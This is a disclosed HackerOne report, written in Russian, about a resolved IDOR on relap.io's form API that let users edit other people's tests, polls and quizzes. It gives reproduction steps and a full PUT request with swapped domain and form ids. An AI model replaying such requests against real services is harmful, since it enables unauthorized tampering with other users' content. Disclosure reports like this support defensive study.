---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1107130'
original_report_id: '1107130'
title: IDOR to edit test/poll/quiz on relap.io
weakness: Insecure Direct Object Reference (IDOR)
team_handle: mailru
created_at: '2021-02-19T11:53:09.910Z'
disclosed_at: '2021-04-23T15:13:31.097Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 13
asset_identifier: Content
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# IDOR to edit test/poll/quiz on relap.io

## Metadata

- HackerOne Report ID: 1107130
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: mailru
- Disclosed At: 2021-04-23T15:13:31.097Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Привет. Здесь сообщение дополнил, как можно найти id формы https://hackerone.com/reports/1106471
Также мы можем любую форму редактировать.

PoC: 
- Открываем свой тест, что-то редачим, сохраняем и ловим запрос
- В запросе меняем id домена и в теле запроса id формы
- id ответов мы можем смотреть, когда через IDOR читаем тесты

█████

```
PUT /lk/api/forms?domain_id=8HKAOg&type=test HTTP/1.1
Host: relap.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://relap.io/forms/1wQEqW-uRb9FLy8v
X-CSRF-TOKEN: 6a6f7de6:9590d7c5
Content-Type: text/plain;charset=UTF-8
Content-Length: 427
Origin: https://relap.io
Connection: close
Cookie: ----

{"id":"LFFR6CjpFO4U6-vr","items":[{"answers":[{"id":"hK5VFvY2ELoQRkZG","is_correct":false,"text":"sdfdsf"},{"id":"Jd8lLOwspiyGqnh4","is_correct":true,"text":"sdfdsf"}],"question":{"id":"dYp15ibmRuFLFAoK","text":"sdfdsf","text_align":"left"},"reaction":{"id":"y33WBvsLOZM5ICAg","text":"","text_align":"left"}}],"layout":"horizontal","name":"Тест1","results":[{"id":"2iXacaFxOpgyoXd3","text":"","title":""}],"status":"draft"}
```

## Impact

Можно менять правильные ответы, или вовсе редактировать тесты, которые опубликованы на чьем-то сайте.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
